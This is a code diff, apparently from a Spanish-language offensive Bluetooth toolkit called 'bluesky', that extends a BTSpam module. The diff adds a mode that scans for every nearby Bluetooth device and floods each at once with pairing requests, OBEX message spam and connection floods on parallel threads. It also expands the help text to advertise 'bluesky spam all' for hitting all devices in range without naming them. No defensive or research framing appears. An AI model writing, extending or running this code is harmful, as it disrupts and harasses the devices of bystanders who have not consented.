@@ -160,8 +160,19 @@ class BTSpam(BaseModule):
         }
         self._adapter_mac = _get_adapter_mac()
 
+    # ─── Pasos del ataque (documentación) ──────────────────────────────────
+
+    STEPS = [
+        "Paso 1: Escaneo de dispositivos Bluetooth cercanos (5s)",
+        "Paso 2: Identificación de targets disponibles",
+        "Paso 3: Selección de técnicas de spam (pairing_flood, obex_spam, connection_flood)",
+        "Paso 4: Ejecución multi-hilo (un hilo por técnica y por target)",
+        "Paso 5: Monitoreo de estadísticas en tiempo real",
+        "Paso 6: Generación de resumen del ataque",
+    ]
+
     def run(self):
-        """Ejecuta el ataque de spam Bluetooth."""
+        """Ejecuta el ataque de spam Bluetooth contra uno o todos los dispositivos."""
         target = self.target
         method = self.options.get("METHOD", "all").lower()
         rate = int(self.options.get("RATE", "10"))
@@ -170,25 +181,44 @@ class BTSpam(BaseModule):
         duration = int(self.options.get("DURATION", "30"))
         delay = int(self.options.get("DELAY", "100")) / 1000.0
 
+        # ── STEP 0: Mostrar pasos ────────────────────────────────────
+        self.result["data"]["steps"] = list(self.STEPS)
+        self.result["data"]["current_step"] = "Preparando ataque..."
+
         if not target:
             return self._scan_and_prompt()
 
+        # ── STEP 1-2: Si target = all/*/broadcast, escanear todos ─────
+        if target.lower() in ("all", "*", "broadcast"):
+            self.result["data"]["current_step"] = "Escaneando dispositivos cercanos..."
+            devices = self._scan_devices()
+            if not devices:
+                self.result["error"] = (
+                    "❌ No se encontraron dispositivos. Asegúrate de que:\n"
+                    "   1. Bluetooth esté encendido\n"
+                    "   2. Haya dispositivos con BT visible en rango\n"
+                    "   3. Tener permisos de escaneo (Linux: bluetoothctl, Windows: bleak)"
+                )
+                self.result["success"] = False
+                return self.result
+
+            self.result["data"]["devices_found"] = devices
+            self.result["data"]["message"] = (
+                f"✅ Escaneo completado: {len(devices)} dispositivo(s) encontrado(s)"
+            )
+            # Atacar a todos
+            return self._attack_all(devices, method, rate, message, count, duration, delay)
+
+        # ── STEP 3-4: Target específico ──────────────────────────────
         self.result["data"]["target"] = target
         self.result["data"]["method"] = method
         self.result["data"]["message_text"] = message
+        self.result["data"]["current_step"] = "Iniciando ataque contra target específico..."
 
         try:
             # Determinar qué técnicas usar
-            methods = []
-            if method == "all":
-                methods = ["pairing_flood", "obex_spam", "connection_flood"]
-            elif method == "pairing_flood":
-                methods = ["pairing_flood"]
-            elif method == "obex_spam":
-                methods = ["obex_spam"]
-            elif method == "connection_flood":
-                methods = ["connection_flood"]
-            else:
+            methods = self._resolve_methods(method)
+            if methods is None:
                 self.result["error"] = f"Método desconocido: {method}"
                 self.result["success"] = False
                 return self.result
@@ -219,6 +249,84 @@ class BTSpam(BaseModule):
 
         except Exception as e:
             self.result["error"] = f"Error en BTSpam: {e}"
+            self.result["success"] = False
+
+        return self.result
+
+    def _resolve_methods(self, method: str) -> Optional[List[str]]:
+        """Resuelve el nombre del método a una lista de técnicas."""
+        if method == "all":
+            return ["pairing_flood", "obex_spam", "connection_flood"]
+        elif method == "pairing_flood":
+            return ["pairing_flood"]
+        elif method == "obex_spam":
+            return ["obex_spam"]
+        elif method == "connection_flood":
+            return ["connection_flood"]
+        return None
+
+    def _attack_all(self, devices: List[Dict], method: str, rate: int,
+                    message: str, count: int, duration: int, delay: float) -> dict:
+        """
+        Ataca a TODOS los dispositivos descubiertos simultáneamente.
+
+        Crea un hilo por dispositivo, cada uno ejecutando el ataque completo.
+        """
+        methods = self._resolve_methods(method)
+        if methods is None:
+            self.result["error"] = f"Método desconocido: {method}"
+            self.result["success"] = False
+            return self.result
+
+        self.result["data"]["target"] = "ALL"
+        self.result["data"]["method"] = method
+        self.result["data"]["methods"] = methods
+        self.result["data"]["total_devices"] = len(devices)
+        self.result["data"]["devices"] = devices
+        # Validar que haya dispositivos
+        if not devices:
+            self.result["error"] = "No hay dispositivos para atacar"
+            self.result["success"] = False
+            return self.result
+
+        self.result["data"]["current_step"] = (
+            f"Atacando a {len(devices)} dispositivos con {len(methods)} técnica(s)..."
+        )
+
+        device_names = {d['mac']: d['name'] for d in devices}
+        macs = [d['mac'] for d in devices]
+
+        try:
+            # ── Un hilo por dispositivo ─────────────────────────────
+            target_threads = []
+            for mac in macs:
+                for m in methods:
+                    t = threading.Thread(
+                        target=self._run_method,
+                        args=(m, mac, rate, message, count, duration, delay),
+                        daemon=True
+                    )
+                    target_threads.append(t)
+                    t.start()
+
+            # Esperar a que terminen
+            for t in target_threads:
+                t.join(timeout=duration + 10)
+
+            self.result["success"] = True
+            # Mapear MACs a nombres
+            hit_with_names = []
+            for mac in self._stats["targets_hit"]:
+                name = device_names.get(mac, "Unknown")
+                hit_with_names.append({"mac": mac, "name": name})
+
+            self.result["data"]["stats"] = dict(self._stats)
+            self.result["data"]["targets_hit"] = list(self._stats["targets_hit"])
+            self.result["data"]["targets_hit_detail"] = hit_with_names
+            self.result["data"]["message"] = self._format_summary(methods)
+
+        except Exception as e:
+            self.result["error"] = f"Error en ataque múltiple: {e}"
             self.result["success"] = False
 
         return self.result
@@ -558,33 +666,75 @@ class BTSpam(BaseModule):
 
     def _scan_and_prompt(self) -> dict:
         """Escanea dispositivos disponibles y sugiere targets."""
+        self.result["data"]["current_step"] = "Escaneando dispositivos Bluetooth..."
         devices = self._scan_devices()
 
         if devices:
             self.result["data"]["devices_found"] = devices
-            msg_lines = [
-                "BTSpam: Se requiere un target específico o usa 'all' para todos.",
+            steps_lines = [
+                "╔═══════════════════════════════════════════════════════════╗",
+                "║           🎯  BTSpam - Bluetooth Spam Attack            ║",
+                "╚═══════════════════════════════════════════════════════════╝",
                 "",
-                "Dispositivos encontrados:",
+                "📋  PASOS DEL ATAQUE:",
+                "───────────────────────────────────────────────────────────",
             ]
-            for d in devices:
-                msg_lines.append(f"  {d['mac']} - {d['name']}")
-            msg_lines.extend([
+            for i, step in enumerate(self.STEPS, 1):
+                steps_lines.append(f"     {step}")
+
+            steps_lines.extend([
                 "",
-                "Uso:  bluesky attack btspam <MAC>",
-                "      bluesky attack btspam all",
-                "",
-                "Opciones: METHOD=pairing_flood|obex_spam|connection_flood|all",
-                "          RATE=10  COUNT=50  MESSAGE='tu texto'",
-                "          DURATION=30  DELAY=100",
+                "📱  DISPOSITIVOS ENCONTRADOS:",
+                "───────────────────────────────────────────────────────────",
             ])
-            self.result["data"]["message"] = "\n".join(msg_lines)
+            for d in devices:
+                steps_lines.append(f"     🔵 {d['mac']}  -  {d['name']}")
+
+            steps_lines.extend([
+                "",
+                "⚡  MODOS DE ATAQUE:",
+                "───────────────────────────────────────────────────────────",
+                "  1. A UN SOLO TARGET:",
+                f"     bluesky spam {devices[0]['mac']}",
+                f"     bluesky spam {devices[0]['mac']} --method obex_spam --rate 50",
+                "",
+                "  2. A TODOS LOS DISPOSITIVOS (automático):",
+                "     bluesky spam all",
+                "     bluesky spam all --method pairing_flood --count 200",
+                "     bluesky spam all --method all --rate 20 --duration 60",
+                "",
+                "🎛️  OPCIONES COMPLETAS:",
+                "───────────────────────────────────────────────────────────",
+                "  --method <m>       all | pairing_flood | obex_spam | connection_flood",
+                "  --rate <n>         Paquetes por segundo (1-100, default: 10)",
+                "  --count <n>        Iteraciones (0=infinito, default: 50)",
+                "  --duration <s>     Duración máxima (default: 30)",
+                "  --delay <ms>       Delay entre ráfagas (default: 100)",
+                "  --message <text>   Mensaje OBEX (default: '👽 Bluesky Spam!')",
+                "",
+                "💡  TIP: Usa 'bluesky spam all' para atacar todos los dispositivos",
+                "     automáticamente sin tener que especificar MACs.",
+            ])
+            self.result["data"]["message"] = "\n".join(steps_lines)
             self.result["success"] = False
         else:
             self.result["data"]["devices_found"] = []
             self.result["data"]["message"] = (
-                "No se encontraron dispositivos. Asegúrate de que Bluetooth esté encendido.\n"
-                "Uso:  bluesky attack btspam <MAC>"
+                "╔═══════════════════════════════════════════════════════════╗\n"
+                "║           ⚠️   NO SE ENCONTRARON DISPOSITIVOS           ║\n"
+                "╚═══════════════════════════════════════════════════════════╝\n"
+                "\n"
+                "📋  PASOS PARA RESOLVER:\n"
+                "───────────────────────────────────────────────────────────\n"
+                "  1. Verifica que Bluetooth esté ENCENDIDO\n"
+                "  2. Asegúrate de que haya dispositivos con BT visible\n"
+                "  3. En Linux:  systemctl start bluetooth\n"
+                "  4. En Windows: Activa Bluetooth desde Configuración\n"
+                "  5. En Termux:  termux-bluetooth-enable\n"
+                "\n"
+                "💡  Si sabes la MAC, úsala directamente:\n"
+                "     bluesky spam AA:BB:CC:DD:EE:FF\n"
+                "     bluesky spam all\n"
             )
             self.result["success"] = False
 
